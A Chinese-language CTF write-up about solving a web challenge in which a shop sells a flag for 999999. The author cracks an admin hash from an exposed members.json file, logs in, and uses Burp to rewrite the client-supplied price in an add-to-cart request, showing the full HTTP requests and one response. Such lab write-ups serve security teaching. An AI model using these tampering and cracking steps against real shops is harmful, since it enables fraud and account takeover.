靶机是一个商城界面,目标是要购买标价999999的flag
尝试所有交互都得登录,所以关注一下登录入口

先尝试一下sql注入?     好像没什么效果

打开f12看看
发现有一个members.json文件
里面储存了username,password和salt
```json
{
    "code": 0,
    "total": 4,
    "members": [
        {
            "id": 1,
            "username": "admin",
            "nickname": "熊掌柜",
            "role": "admin",
            "password": "70dad06692cec77bb7dde33b73d7a41d",
            "salt": "a1b2c3d4"
        },
        {
            "id": 2,
            "username": "xiaoxiong",
            "nickname": "小熊嘟嘟",
            "role": "user",
            "password": "1818d151584e13a118a5881a96b4a75b",
            "salt": "1a2b3c4d"
        },
        {
            "id": 3,
            "username": "honeylover",
            "nickname": "蜂蜜控",
            "role": "user",
            "password": "b0d4734a35f68ae3edeffcb536b754fb",
            "salt": "9f8e7d6c"
        },
        {
            "id": 4,
            "username": "vip_panda",
            "nickname": "胖达VIP",
            "role": "user",
            "password": "7e50f83b0d2b42416569040e1accc58d",
            "salt": "5e5e5e5e"
        }
    ]
}
```
显然主要关注admin账号,而且账号密码被加密了,需要尝试爆破解密

最后用AI写的脚本得到了密码(),额是有点不太好,但是先这样吧,主要是让我//TODO写py脚本的话又得学一星期()

登录成功
尝试结算购买,发现没有足够的钱

那尝试burp抓包改钱试试?

首先尝试在结算界面抓包,
```http
GET /api/order/checkout HTTP/1.1
Host: forward.vidar.club:32745
Content-Length: 2
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
X-Token: 5e3ec55e22b201ecdb3e07ae1c13215b
Content-Type: application/json
Origin: http://forward.vidar.club:32745
Referer: http://forward.vidar.club:32745/cart.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: session=eyJjYXB0Y2hhIjoiemhteCJ9.attdPA.eIbZgBXL0ceOs7k-D7SuaV9Bi1w
Connection: keep-alive

{}
```
发现报文里面没有任何有关id或者价格钱的信息,只是一条get报文
response:
```http
HTTP/1.1 200 OK
Server: Werkzeug/3.1.8 Python/3.11.15
Date: Fri, 23 Oct 2026 13:20:01 GMT
Content-Type: application/json; charset=utf-8
Content-Length: 97
Connection: close

{"code": 6, "msg": "蜂蜜余额不足，无法结算 🐻", "total": 999999.0, "balance": 99999}
```
尝试改成POST以后再用json上传balance数据
好像不行,本来就没有设计POST的接口

那再看看其他的包
发现上传购物车的包有突破点:
```http
POST /api/cart/add HTTP/1.1
Host: forward.vidar.club:31719
Content-Length: 45
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/155.0.0.0 Safari/537.36 Edg/155.0.0.0
Accept: application/json, text/javascript, */*; q=0.01
X-Token: e2883b49b739066a428c0b769446f217
Content-Type: application/json
Origin: http://forward.vidar.club:31719
Referer: http://forward.vidar.club:31719/index.html
Accept-Encoding: gzip, deflate, br
Accept-Language: zh-CN,zh;q=0.9,en;q=0.8,en-GB;q=0.7,en-US;q=0.6
Cookie: session=eyJjYXB0Y2hhIjoiM3Y2diJ9.atturw.l7cTXTfP5g0loD-ifhI4M0ZeI-E
Connection: keep-alive

{"product_id":99,"quantity":1,"price":999999}
```
不仅上传了id和数量,也上传了price
那好办了,直接改低价格,然后Send
ok